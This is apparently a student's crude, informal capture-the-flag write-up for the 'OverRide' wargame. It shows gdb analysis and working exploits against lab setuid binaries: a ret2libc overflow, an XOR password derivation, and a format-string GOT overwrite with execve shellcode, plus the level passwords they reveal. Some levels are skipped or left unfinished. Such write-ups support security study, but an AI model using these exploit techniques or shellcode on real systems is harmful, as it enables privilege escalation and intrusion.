# override
road to getting kicked out continues

**here we fucking go, pwn?**

The issue with this shit is that it's too fucking fun and tempting.
## level 00
A little binary asking for a password, very fucking original.

This shit asks for a password with scanf, the stores it and compares it to **0x149c**
```
0x080484d7 <+67>:    mov    DWORD PTR [esp+0x4],edx
   0x080484db <+71>:    mov    DWORD PTR [esp],eax
   0x080484de <+74>:    call   0x80483d0 <__isoc99_scanf@plt>
   0x080484e3 <+79>:    mov    eax,DWORD PTR [esp+0x1c]
=> 0x080484e7 <+83>:    cmp    eax,0x149c
```
so i printed it
```
(gdb) p 0x149c
$1 = 5276
```
if **JE**, it prints
```
(gdb) x/s 0x8048649
0x8048649:       "/bin/sh"
```
soooo
```
$ cat /home/user/level01/.pass
cat: /home/user/level01/.pass: No such file or directory
$ ls
level00
$ whoami
level01
$ ls /home/user
ls: cannot access /home/user: No such file or directory
$ ls /home/users
ls: cannot open directory /home/users: Permission denied
$ cat /home/users/level01/.pass
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
```
Shit, fucking idiots on the subject it says */home/user*, fucking got an anxiety attack from that.
## level01
```
level00@OverRide:~$ su level01
Password:uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```
another binary, fucking stop it
```
level01@OverRide:~$ file level01 
level01: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x923fd646950abba3d31df70cad30a6a5ab5760e8, not stripped
```
why is this shit never stripped
```
level01@OverRide:~$ checksec --file level01 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01
```
Nothing interesting, I should solve this quickly or my ego will fucking give up.

Asks for a username, and already getting an invalid username error message, so fucking great start
```
    0x0804852d <+93>:    call   0x8048464 <verify_user_name>
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
    0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
(gdb) disassemble verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     push   %edi
   0x08048468 <+4>:     push   %esi
=> 0x08048469 <+5>:     sub    $0x10,%esp
   0x0804846c <+8>:     movl   $0x8048690,(%esp)
   0x08048473 <+15>:    call   0x8048380 <puts@plt>
   0x08048478 <+20>:    mov    $0x804a040,%edx
   0x0804847d <+25>:    mov    $0x80486a8,%eax
   0x08048482 <+30>:    mov    $0x7,%ecx
   0x08048487 <+35>:    mov    %edx,%esi
   0x08048489 <+37>:    mov    %eax,%edi
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:    seta   %dl
   0x08048490 <+44>:    setb   %al
   0x08048493 <+47>:    mov    %edx,%ecx
   0x08048495 <+49>:    sub    %al,%cl
   0x08048497 <+51>:    mov    %ecx,%eax
   0x08048499 <+53>:    movsbl %al,%eax
   0x0804849c <+56>:    add    $0x10,%esp
   0x0804849f <+59>:    pop    %esi
   0x080484a0 <+60>:    pop    %edi
   0x080484a1 <+61>:    pop    %ebp
   0x080484a2 <+62>:    ret
```
interesting **repz cmpsb**, with eax = $0x80486a8 as the dest pointer, and edx = $0x804a040 as the src,

dst contains the username that is *right*, to be compared character by character with **our** username
```
(gdb) print 0x804a040
$3 = 134520896
(gdb) x/s 0x804a040
0x804a040 <a_user_name>:         "mok\n"
(gdb) x/s 0x80486a8
0x80486a8:       "dat_wil"
```
Oh I used **mok** as the username
## username is
dat_wil

```
(gdb) c
Continuing.
Enter Password:
```
now that we're through with the username, comes the fucking password, for fuck's sake, one thing at a time
```
(gdb) disassemble verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:     push   %ebp
   0x080484a4 <+1>:     mov    %esp,%ebp
   0x080484a6 <+3>:     push   %edi
   0x080484a7 <+4>:     push   %esi
   0x080484a8 <+5>:     mov    0x8(%ebp),%eax
   0x080484ab <+8>:     mov    %eax,%edx
   0x080484ad <+10>:    mov    $0x80486b0,%eax
   0x080484b2 <+15>:    mov    $0x5,%ecx
   0x080484b7 <+20>:    mov    %edx,%esi
   0x080484b9 <+22>:    mov    %eax,%edi
   0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x080484bd <+26>:    seta   %dl
   0x080484c0 <+29>:    setb   %al
   0x080484c3 <+32>:    mov    %edx,%ecx
   0x080484c5 <+34>:    sub    %al,%cl
   0x080484c7 <+36>:    mov    %ecx,%eax
   0x080484c9 <+38>:    movsbl %al,%eax
   0x080484cc <+41>:    pop    %esi
   0x080484cd <+42>:    pop    %edi
   0x080484ce <+43>:    pop    %ebp
   0x080484cf <+44>:    ret
```
in the verify_user_pass
```
(gdb) x/s 0x80486b0
0x80486b0:       "admin"
```
this is the fucking password, very fucking creative
```
(gdb) c
Continuing.
nope, incorrect password...
```
**the fuck**, guess there should be an overflow here
```
0x0804856d <+157>:   lea    eax,[esp+0x1c]
0x08048571 <+161>:   mov    DWORD PTR [esp],eax
0x08048574 <+164>:   call   0x8048370 <fgets@plt>
```
*now I move to intel syntax, cuz im gay*

the inputed password is at [esp+0x1c], and fgets reads 64 bytes I guess **0x08048565 <+149>:   mov    DWORD PTR [esp+0x4],0x64**

```
0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx
   0x080484ed <+29>:    rep stos %eax,%es:(%edi)
```
is this zero'ing the buffer?
### rep stos
**REP OPERAND**:
```
for (; ecx > 0; ecx--) OPERAND
```
**STOS OPERAND**:
```
stores the value of AL or AX, or EAX in the given memory operand. Register size is defined by the memory location size hence the DWORD in your code.
```
*stolen from **https://reverseengineering.stackexchange.com/questions/14073/when-do-rep-and-stos-appear-in-compiled-c***

so it does a bzero of 0x10 bytes, therefore buffer size is 16
### I dont know what the fuck Im doing anymore
```
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
the saved return address was overritten with **0x37634136**
```
(gdb) x/40wx $esp
0xffffd6b0:     0xffffd6cc      0x00000064      0xf7fcfac0      0x00000001
0xffffd6c0:     0xffffd8d1      0x0000002f      0xffffd71c      0x41306141
0xffffd6d0:     0x61413161      0x33614132      0x41346141      0x61413561
0xffffd6e0:     0x37614136      0x41386141      0x62413961      0x31624130
0xffffd6f0:     0x41326241      0x62413362      0x35624134      0x41366241
0xffffd700:     0x62413762      0x39624138      0x41306341      0x63413163
0xffffd710:     0x33634132      0x41346341      0x63413563      0x37634136
0xffffd720:     0x41386341      0x64413963      0x31644130      0x00326441
0xffffd730:     0x00000000      0xffffd71c      0xffffd7bc      0x00000000
0xffffd740:     0x08048250      0xf7fceff4      0x00000000      0x00000000
```
*0xffffd71c - 0xffffd6cc = 0x50 = 80 is our offset*
```
(gdb) r < <(python -c 'print "dat_wil\n" + "A" * 80 + "\xcc\xd6\xff\xff"')
Program received signal SIGILL, Illegal instruction.
0xffffd70c in ?? ()
```
The fuck happened here.
```
(gdb) x/40wx $esp
0xffffd6b0:     0xffffd6cc      0x00000064      0xf7fcfac0      0x00000001
0xffffd6c0:     0xffffd8d1      0x0000002f      0xffffd71c      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd700:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd710:     0x41414141      0x41414141      0x41414141      0xffffd6cc
0xffffd720:     0x0000000a      0xffffd7b4      0xffffd7bc      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7bc      0x00000000
0xffffd740:     0x08048250      0xf7fceff4      0x00000000      0x00000000
```
yep, we need system, exit and a "/bin/sh" string addresses
```
(gdb) info proc map
process 1884
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
    0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
    0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
    0xf7e2b000 0xf7e2c000     0x1000        0x0 
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
    0xf7fd0000 0xf7fd4000     0x4000        0x0 
    0xf7fd8000 0xf7fdb000     0x3000        0x0 
    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
```
("A" * 80) + "0xf7e6aed0" + "ret = 0xf7e5eb70" + "0xf7f897ec"
```
level01@OverRide:~$cat <(python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"') - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
level01@OverRide:~$ su level02
Password:PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```
## level03
```
level02@OverRide:~$ su level03
Password:Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
```
### stack canaries
**A stack canary is a value placed on the stack so that it will be overwritten by a stack buffer that overflows to the return address. It allows detection of overflows by verifying the integrity of the canary before function return.**

in the end only used to not let us modify eip

```
   0x080488ba <+96>:    mov    DWORD PTR [esp+0x4],edx
   0x080488be <+100>:   mov    DWORD PTR [esp],eax
=> 0x080488c1 <+103>:   call   0x8048530 <__isoc99_scanf@plt>
```
executable prints stupid shit then asks for a password, with **scanf(EAX = 0x8048a85 = "%d", EDX = 0xffffd70c)**
```
(gdb) i r
eax            0x8048a85        134515333
ecx            0x0      0
edx            0xffffd70c       -10484

(gdb) x/s 0x8048a85
0x8048a85:       "%d"
(gdb) x/40wx $esp 
0xffffd6f0:     0x08048a85      0xffffd70c      0xf7fceff4      0xf7e5ede5
```
**The scanf() function returns the number of fields that were successfully converted and assigned.**

with a break before call to function **test**
```
0x080488ca <+112>:   mov    DWORD PTR [esp+0x4],0x1337d00d
0x080488d2 <+120>:   mov    DWORD PTR [esp],eax


(gdb) x/40wx $esp
0xffffd6f0:     0xf7fceff4      0x1337d00d
```
that weird nunber is pushed to stack **0x1337d00d = 322424845** along with return of scanf **EAX = 0xf7fceff4**
```
0x0804874d <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048750 <+9>:     mov    edx,DWORD PTR [ebp+0xc]
=> 0x08048753 <+12>:    mov    ecx,edx
   0x08048755 <+14>:    sub    ecx,eax
   0x08048757 <+16>:    mov    eax,ecx
```
**test** is called and **EAX = 0xf7fceff4** and **EDX = 0x1337d00d** then **ECX = EDX**,

And wtf a **ECX = 0x1337d00d - EAX** and EAX comes from: [EBP + 0x8], EDX from [EBP + 0xc]
```
(gdb) x/40wx $ebp 
0xffffd6e8:     0xffffd718      0x080488da      0xf7fceff4      0x1337d00d
```
Break after SUB ECX, EAX 
```
(gdb) i r
eax            0x1337d00d       322424845
ecx            0x0      0
edx            0x1337d00d       322424845
```
*input i gave was 322424845 thats why **EAX = EDX = 0x1337d00d** so **ECX = EDX - EAX = 0x0***
```
   0x08048759 <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804875c <+21>:    cmp    DWORD PTR [ebp-0xc],0x15
   0x08048760 <+25>:    ja     0x804884a 
```
The result of the substraction is then compared with **0x15 = 21**, if > 0x15 it jumps to **0x804884a <test+259>**

Else, it does a whole lot of shit, fucking kill me

lots of fucking calls to **decrypt()** function, so Im guessing it's an if else situation maybe, good news is the decrypt function has a call to system("/bin/sh"), also no matter what, the decrypt function is called even in the **jna** case

### JA case
calls decrypt with a random number
In the decrypt function, takes some string at **ebp-0xd**, then xors each byte with the difference of input and the weird number

If the result of that shit id **"Congratulations!"**, it gives a shell
the string it xors with is:
```
(gdb) i r
eax            0xffffd69b       -10597


(gdb) x/s 0xffffd69b
0xffffd69b:      "Q}|u`sfg~sf{}|a3"
```
so "Q}|u`sfg~sf{}|a3" XOR KEY = "Congratulations!"

*using **http://xor.pw/#***

Since XOR is associative and commutative
```
X XOR KEY = Y
X XOR (X XOR KEY) = X XOR Y
(X XOR X) XOR KEY = X XOR Y
KEY = X XOR Y
```
'Q' XOR 'C' = 0x12 = 18, so thats the keeeeey

in the end
```
stupid-string XOR (0x1337d00d - input) = stupid-string XOR 0x12 = "Congratulations!"
0x1337d00d - input = 0x12
input = 0x1337d00d - 0x12 = 0x1337CFFB = 322424827
```
trying it
```
level03@OverRide:~$ ./level03 
***********************************
*               level03         **
***********************************
Password:322424827
$ whoami
level04
$ cat /home/users/level04/.pass
kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```
## level04
```
level03@OverRide:~$ su level04
Password:kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```
Lots of calls of ptrace, this doesnt look good.

Starts with a **fork**, the parent process executes a ptrace, fucking kill me
```
	0x080487ba <+242>:   mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:   mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:   mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:   mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:   mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
```

then compares return of ptrace with 0xb ???
```
	0x080487e1 <+281>:   mov    DWORD PTR [esp+0xa8],eax
   	0x080487e8 <+288>:   cmp    DWORD PTR [esp+0xa8],0xb
```
if it is equal to 0xb, it outputs "No exec() for you" and kills child

so 0xb is for exec() ?

**flag**
```
level00@OverRide:~$ su level05
Password:3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
## level05
the binary uses printf, do format string?

binary reads input into a 100 character buffer
```
0x08048466 <+34>:    mov    DWORD PTR [esp+0x4],0x64
```
then checks if each character is lowercase if it isn't it does a XOR character with 0x20, so I guess we cant inject shellcode

and of course a fucking exit and not a RET, kill me
## options
change call to exit in GOT

another option i dk, use printf to return to main?
```
(gdb) r <<< $(python -c "print 'AAAA' + '%p ' * 15")
aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6cf 0xffffd6ce (nil) 0xffffffff 0xffffd754 (nil) 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```
so offset is 10
## GOT OVEWRITE
vulnerability in printf()
```
   0x08048500 <+188>:   lea    eax,[esp+0x28]
   0x08048504 <+192>:   mov    DWORD PTR [esp],eax
   0x08048507 <+195>:   call   0x8048340 <printf@plt>

```
format vuln as printf doesnt take any format strings as args, just printf(buffer);

so memory can be dumped with format strings as input
```
(gdb) r <<< "AAAA%p %p %p"
aaaa0x64 0xf7fcfac0 0xf7ec3af9
```
with exit(0) though, the program never returns. so we need to stop it from exiting.

because **GOT** is writable, and whenever these functions(like exit(), printf(), etc.) are called, GOT entry of respective function is looked up first, then program counter jumps to that address.

What if we modify the GOT entry of a function with format strings. Whenever that function will be called, the program counter will go to the modified GOT entry.

### exit() to main()
```
(gdb) info functions main
0x08048444  main
```
address is **134513732** in decimal, It means we will need to print 134513732 bytes to get to **0x08048444**. pretty fucking useless

#### divide address into parts
First we will use %p to print **0x44** thats **68 bytes** and a %n pointing to exit@got.plt then for the rest **0x8048** whichh is **32840 bytes** we neeed **(32840 - 68 = 32772)** bytes, more with %p and then next "%n" at (exit@got.plt+1) address. And finally there will be address of exit@got.plt and exit@got.plt+1 in payload so that we can make %n point to it.

```
(gdb) info function exit
0x08048370  exit

(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:        jmp    DWORD PTR ds:0x80497e0
```
address of exit in the GOT is **0x80497e0**

now we need the address of our shellcode
```
level05@OverRide:~$export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')

level05@OverRide:~$gdb level05
(gdb)x/500s $esp
```
so the address of shellcode is too fucking long, so needs to be split into two **0xffffdc59** = **0xffffdc59**

**0xdc59** = 56409 - 4 - 4, for two exit addresses

```
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
```

```
cat /home/users/level06/.pass        
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

level05@OverRide:~$ su level06
Password:h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
